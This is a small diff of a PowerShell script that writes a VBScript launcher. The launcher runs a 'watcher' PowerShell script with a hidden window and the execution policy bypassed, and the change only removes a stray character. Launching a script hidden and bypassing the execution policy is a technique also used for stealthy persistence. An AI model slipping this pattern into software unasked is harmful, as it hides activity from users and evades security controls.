@@ -109,7 +109,7 @@ while (`$true) {
 
     $VbsScriptContent = @"
 Dim shell
-Set shell = CreateObject("Wscript.Shell") *
+Set shell = CreateObject("Wscript.Shell") 
 shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$WatcherScriptPath""", 0, False
 "@
     Set-Content -Path $VbsPath -Value $VbsScriptContent -Force
